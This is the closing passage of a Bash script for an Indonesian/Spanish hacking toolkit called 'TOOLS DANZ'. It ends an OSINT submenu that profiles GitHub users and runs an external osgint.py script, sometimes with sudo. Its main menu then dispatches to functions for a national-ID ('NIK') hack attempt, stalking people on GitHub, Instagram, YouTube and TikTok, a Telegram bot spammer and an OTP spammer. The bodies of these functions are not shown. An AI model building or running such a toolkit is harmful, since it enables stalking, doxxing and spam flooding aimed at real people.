                    echo "[*] Profile Photo/Foto: " `cat requisitos/resultados/Git-$username.txt 2>/dev/null | awk '/url/&&/avatars/ {print $2}' | cut -c 2- | rev | cut -c3- | rev` >&2
                    echo >&2
                    echo "[*] URL Perfil: https://github.com/$username" >&2
                    echo >&2
                    sleep 2
                    if [ -x "requisitos/osgint/osgint.py" ]; then
                        echo -e "${CYAN}[*] Menjalankan Python Tool 'osgint.py' (Mungkin perlu Sudo)...${NC}" >&2
                        if command -v sudo &> /dev/null; then
                            sudo python3 requisitos/osgint/osgint.py -u "$username"
                        else
                            python3 requisitos/osgint/osgint.py -u "$username"
                        fi
                    else
                         echo -e "${RED}[!] osgint.py tidak ditemukan atau tidak dapat dieksekusi.${NC}" >&2
                    fi
                    ;;
                99 ) return 0 ;;
                * )	echo >&2
                    echo -e "${RED}Pilihan tidak valid. Coba lagi!${NC}" >&2
                    ;;
            esac
            
            echo >&2
            echo >&2
            echo -e "${CYAN}#####################${NC}" >&2
            if [[ "$LANG_CODE" == "1" ]]; then
                 echo "[1] Volver a Ejecutar (Menu OSINT)" >&2
                 echo "[2] Salir (Menu Utama Danz)" >&2
            else
                 echo "[1] Return to Execute (OSINT Menu)" >&2
                 echo "[2] Exit (Danz Main Menu)" >&2
            fi
            echo -e "${CYAN}#####################${NC}" >&2
            echo >&2
            read -p "Elige una opcion / Choose an option: " opc3
            case $opc3 in
                2 ) return 0 ;;
                * ) continue ;;
            esac
        }

        case $opc1 in
            1 ) run_osint_options "1" ;;
            2 ) run_osint_options "2" ;;
            * ) echo -e "${RED}Pilihan tidak valid. Coba lagi!${NC}" >&2 ; sleep 1 ;;
        esac
    done
}


# --- Loop Utama Program (DIUBAH UNTUK HANDLE MENU BARU) ---
check_dependencies
access_check

while true
do
    display_menu
    read CHOICE

    case $CHOICE in
        1|01) check_ip_real ;;
        2|02) nik_hack_attempt ;;
        3|03) osint_scanner_menu ;; 
        4|04) github_stalker ;; 
        5|05) instagram_stalker ;;
        6|06) youtube_stalker ;;
        7|07) tiktok_stalker_siputzx ;;
        8|08) tiktok_stalker_baguss ;;
        9|09) telegram_bot_spammer ;;
        10) otp_spammer_menu ;;
        11) tiktok_downloader_menu ;; # Menu baru
        99) echo -e "${RED}Exiting TOOLS DANZ, sampai jumpa di lain waktu!${NC}" >&2 ; exit 0 ;;
        *) echo -e "${RED}Pilihan tidak valid: ${CHOICE}. Coba lagi!${NC}" >&2 ; sleep 1 ;;
    esac
done
##